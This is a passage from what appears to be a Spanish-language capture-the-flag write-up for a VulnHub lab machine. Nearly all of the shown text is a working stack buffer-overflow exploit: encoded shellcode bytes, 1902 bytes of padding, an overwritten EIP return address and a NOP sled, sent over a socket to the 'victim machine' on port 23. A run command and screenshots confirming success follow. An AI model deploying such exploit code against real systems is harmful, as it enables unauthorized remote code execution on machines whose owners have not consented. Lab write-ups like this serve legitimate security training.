"\x10\x60\xfc\xdb\x6c\x19\xef\xfd\x94\xd9\xa1\xc3\x9b\xb9"
"\x6b\xf6\x09\x08\x03\x1c\x87\x3b\x54\xc2\x55\x9a\x69\x87"
"\x3d\x3a\xe1\x68\x02\xab\x47\xb1\x58\x6d\x02\x18\x20\x48"
"\x13\x53\x64\x28\x57\xc5\x32\x3a\x55\xd3\x32\x22\x55\xc3"
"\x37\x3a\x6b\xec\xa8\x53\x85\x6a\xb1\xe5\xe3\xdb\x32\x2a"
"\xfc\xa5\x0c\x64\x84\x88\x04\x93\xd6\x2e\x84\x71\x29\x9f"
"\x0c\xca\x96\x28\xf9\x93\xd6\xa9\x62\x10\x09\x15\x9f\x8c"
"\x76\x90\xdf\x2b\x10\xe7\x0b\x06\x03\xc6\x9b\xb9")
  
buff = "A"*1902
eip = '\xD0\x12\x50\x62'
nullByte = "\x00"
nops = "\x90" * 30

buffer = buff + eip + nops + shellcode

try:
	print("[*] Sending bytes")
	
	#Create socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(1)
	
	#Connect to victim machine
	s.connect((args['rh'], args['rp']))
	
	#save response of 1024 bytes
	s.recv(1024)
	
	#send bytes
	s.send(buffer) 
except:
	print("[*] Crash")
	sys.exit(0)
	
```


```shell
python2 exploitBOF.py -rh <host_victim> -rp 23
```

![Nombre Descriptivo](/assets/img/posts/20240311121432.png)

Y vaya, funciona, ahora, solo falta ejecutarlo sobre la máquina.

![Nombre Descriptivo](/assets/img/posts/20240311121920.png)

🏴.


---

*Referencias*

- https://www.iihack.com/2020/12/04/vulnhub-613.html
- https://www.youtube.com/watch?v=25RckCME6-A&pp=ygUOc2Nob29sIHZ1bG5odWI%3D
- https://www.cnblogs.com/404p3rs0n/p/15395152.html